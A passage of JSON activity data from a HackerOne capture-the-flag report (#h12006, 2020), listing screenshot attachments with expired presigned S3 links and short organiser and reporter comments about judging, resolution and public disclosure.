JQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c009b27b63d78a882e1e7d838171b50798c7d47a2bb3b99ce0b2deb960966d9"
                },
                {
                    "id": 861245,
                    "filename": "collaboratorcssfire.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4rrFerNthc9PypbyY7p2kFZr?response-content-disposition=attachment%3B%20filename%3D%22collaboratorcssfire.jpg%22%3B%20filename%2A%3DUTF-8%27%27collaboratorcssfire.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=626cd38ccee62830b2df90ce74459d847013f7fdd5bb4a7add7ea0def41010f9"
                },
                {
                    "id": 861244,
                    "filename": "collaborator.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jGMaAEGejSrNXMvKqiU7wCSa?response-content-disposition=attachment%3B%20filename%3D%22collaborator.jpg%22%3B%20filename%2A%3DUTF-8%27%27collaborator.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=840e308f0627372b0c3550278d7c6c3a1957e233aad75d7571eb95a51c83b351"
                },
                {
                    "id": 861243,
                    "filename": "badge.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ytnEhUpVSf1BDa6n9wSu14Pw?response-content-disposition=attachment%3B%20filename%3D%22badge.jpg%22%3B%20filename%2A%3DUTF-8%27%27badge.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=194a81aef1adaee44d7a13e4eefde4aed5564ec832a4d8e723ea4e15c12c6018"
                },
                {
                    "id": 861242,
                    "filename": "adminpannel.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t1znYBTEhtxXqSBNPzsYwL3w?response-content-disposition=attachment%3B%20filename%3D%22adminpannel.jpg%22%3B%20filename%2A%3DUTF-8%27%27adminpannel.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7046f9503e03477368afed7b659e4842fc4077d7b183911841b239f1a8dba48c"
                },
                {
                    "id": 861241,
                    "filename": "2fawindow.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9Z9hSLAne4T8JAhPrt4yJaGX?response-content-disposition=attachment%3B%20filename%3D%222fawindow.jpg%22%3B%20filename%2A%3DUTF-8%27%272fawindow.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=971afb0d5a8cc0c49f6462997539af606de4143d8096fc56402fdb1536467ae7"
                },
                {
                    "id": 861240,
                    "filename": "stalkergui.JPG",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WWsy24sKwjNg14fXFsgoniZF?response-content-disposition=attachment%3B%20filename%3D%22stalkergui.JPG%22%3B%20filename%2A%3DUTF-8%27%27stalkergui.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=626ab8bb9508675d91e5c43752835cbbfb711340c248c9eafe1019997378f42d"
                },
                {
                    "id": 861239,
                    "filename": "2fa.jpg",
                    "type": "image/jpeg",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VX5wf5PzVdj8bybgkVtYyeUd?response-content-disposition=attachment%3B%20filename%3D%222fa.jpg%22%3B%20filename%2A%3DUTF-8%27%272fa.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3M3ZUGHF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072205Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDalu3R3A%2FswTPJ4xVHOG9Rxl2RApgY8sDhKppqfGAqUQIgYRBv%2BXAmyBbaQawCIn40ZDK40fVkJHB%2FveoHhr1DlesqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJ%2F4bKMCrS7jIJwMtiqOBd%2FriANSh5ipBo8Pk%2F2qb1z5a0uuM2PdRzqESOe7VvDp2Qb4FOUjbmWUlbaFWD8QKCBfRxUchp5N36dI8BDE1Fu3JNTXj6zUJB8ynNY37PM8a9OxhHOFsdRIDX2DAUt99aaSeFLpCfWSzZmgFg5zOzSET2USuldSMvVn0mF6Q3TgV0FGypNplJbb7pipy5SsltuaylNiSVXn7ksT4%2BCaiDyPu0aiEximdK7dDGqZGy%2FV5TM3wWaZyabFm5LkvbKmkMsSuy%2FteOZVfnz5WS54DCAgFk3BkYRe1sR9v7G6bWkI2wLugYmg72chgnrnriCzE0hGEXnO9EFMBws0BGBY3Ug4FDE1TZMi87%2FqBcGR97mlCIYsP%2BVCM723Bd6WSUS%2BzEeBYFoUT9iO5YHFEy8fw%2FnrM1iOt1nKsPdTdOzQduTV1SlzJ%2FDLuHjFyVBWGCivs88xGFIqJPeFqSOHqUo3UzYeDQhdPJzkDDM%2FI9njibpaiyGs1oALVu3IBnIxkXS5CHFpYciPsHF%2F4raxKXpon6BMx3ZAMKTfhYOcFqIcFIDi22YkKJxYedXNOhMtQ7sTAYBwZG%2B1z%2FgIPfJPJeN4BkF%2FNpnvwThw2cbyM6EmTfwe0qqtLfmIZHaIa0eyCtd96iO15JfptkDRrrOb3Aqpkp15g%2B22lD4mhnBnaJv67%2FvHeJH7Nir6w%2BxGqIJmozIJ828xZ2Pr97VsI4EmPi637KNZV5SVnXEIkRqhsZCEz%2F8o4v6m8mHkk2%2B9mlkkXMjGHrcFiHKSwnWxuDY%2BhaT9EfJFDQakyKaWJXWwRUI9%2F%2Bgz3LwComeOi11ysyBCCZsLyamqnStpOeP6aNEUTXLa%2B0OTdU22NEbO4iiVsv63jDDcqranBjqxASLvyauRn%2FzRj6Fk%2FoXEaEcToFwsxz%2FuiH7YLtJQoADGa4xQ%2BHp5%2BtVbj10EvYfXNdzqfn7NU0Zp7FAb4j2bw73CIg1m%2F%2BG0yg9qkKCCJeh9mVROmsoU9faMoswyb5G0l01K547DYaXx6PXGCdiFcf3FmifZ66Uzod21ITV%2B%2FEeXzYeGCknxhsK9dcOw4z5NYmglL7Ns1qDcK6MTZ8044CCp6XRpr%2Fr8GamPJmpfWx1T2Q%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6e91a7bdd858e2a8d0f7ad85c97bfc65f5f45f338194de016f2a80953d69fd8a"
                }
            ],
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8268312,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!",
            "automated_response": false,
            "created_at": "2020-06-11T23:03:05.627Z",
            "updated_at": "2020-06-11T23:03:05.627Z",
            "actor": {
                "username": "nahamsec",
                "cleared": true,
                "verified": true,
                "url": "/nahamsec",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8324969,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugResolved",
            "message": "Thank you again for participating in the #h12006 CTF! ",
            "automated_response": false,
            "created_at": "2020-06-17T22:28:18.051Z",
            "updated_at": "2020-06-17T22:28:18.051Z",
            "actor": {
                "username": "nahamsec",
                "cleared": true,
                "verified": true,
                "url": "/nahamsec",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "reporter": {
                "username": "counterbreach",
                "url": "/counterbreach"
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8325023,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Thank you for the awesome challenge! ",
            "automated_response": false,
            "created_at": "2020-06-17T22:30:38.718Z",
            "updated_at": "2020-06-17T22:30:38.718Z",
            "actor": {
                "username": "counterbreach",
                "cleared": false,
                "verified": false,
                "url": "/counterbreach",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/Vx5BUBb6Aafcet2ejiib45JS/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8329795,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-18T10:29:11.941Z",
            "updated_at": "2020-06-18T10:29:11.941Z",
            "first_to_agree": true,
            "actor": {
                "username": "counterbreach",
                "cleared": false,
                "verified": false,
                "url": "/counterbreach",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/Vx5BUBb6Aafcet2ejiib45JS/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8332767,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-18T15:27:57.995Z",
            "updated_at": "2020-06-18T15:27:57.995Z",
            "actor": {
                "username": "nahamsec",
                "cleared": true,
                "verified": true,
                "url": "/nahamsec",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "h1-ctf"
        },
        {
            "id": 8332768,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2020-06-18T15:27:58.063Z",
            "updated_at": "2020-06-18T15:27:58.063Z",
            "actor": {
                "username": "nahamsec",
                "cleared": true,
                "verified": true,
                "url": "/nahamsec",
                "profile_picture_urls": {
